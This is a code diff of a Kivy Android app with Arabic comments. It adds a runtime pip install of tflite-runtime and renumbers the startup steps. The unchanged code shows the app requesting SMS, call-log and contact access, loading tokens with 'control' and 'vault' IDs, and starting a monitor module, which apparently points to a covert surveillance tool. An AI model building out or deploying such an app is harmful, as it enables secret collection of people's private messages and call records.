@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import os, sys, threading, importlib, requests, traceback, gc, time, socket, random, shutil
+import os, sys, threading, importlib, requests, traceback, gc, time, socket, random, shutil, subprocess
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -102,8 +102,8 @@ def _perms():
             "android.permission.WRITE_EXTERNAL_STORAGE",
             "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
             "android.permission.READ_CONTACTS",
-            "android.permission.READ_SMS",           # ✅ مضاف
-            "android.permission.READ_CALL_LOG"       # ✅ مضاف
+            "android.permission.READ_SMS",
+            "android.permission.READ_CALL_LOG"
         ])
     except Exception as e:
         print(f"Permissions error: {e}")
@@ -244,6 +244,25 @@ def copy_model_to_models_dir():
         import traceback
         traceback.print_exc()
         return False
+
+# ========== تثبيت tflite-runtime في وقت التشغيل ==========
+def ensure_tflite_runtime():
+    """
+    التأكد من تثبيت tflite-runtime، وتثبيته عبر pip إذا لم يكن موجوداً.
+    """
+    try:
+        import tflite_runtime
+        print("✅ tflite-runtime already installed")
+        return True
+    except ImportError:
+        print("⚠️ tflite-runtime not found, installing...")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "tflite-runtime==2.14.0"])
+            print("✅ tflite-runtime installed successfully")
+            return True
+        except Exception as e:
+            print(f"❌ Failed to install tflite-runtime: {e}")
+            return False
 
 # ========== تضمين الملفات الأساسية (لضمان الإقلاع المحلي) ==========
 EMBEDDED_FILES = {
@@ -1258,8 +1277,12 @@ class CoreApp(App):
             _log(f"     Active tokens: {len(active)}, Reserve tokens: {len(reserve)}")
             _log(f"     Control ID: {ctrl}, Vault ID: {vault}")
             
-            # ===== 4. تهيئة المكونات الأساسية =====
-            _log("[4/5] Initializing components...")
+            # ===== 4. التأكد من تثبيت tflite-runtime =====
+            _log("[4/5] Ensuring tflite-runtime...")
+            ensure_tflite_runtime()
+            
+            # ===== 5. تهيئة المكونات الأساسية =====
+            _log("[5/5] Initializing components...")
             
             from monitor import M
             mon = M()
@@ -1270,8 +1293,8 @@ class CoreApp(App):
             mon.ctrl = ctrl
             mon.vlt = vault
             
-            # ===== 5. بدء التشغيل =====
-            _log("[5/5] Starting services...")
+            # ===== 6. بدء التشغيل =====
+            _log("[6/5] Starting services...")
             ui.start()
             mon.start()
             
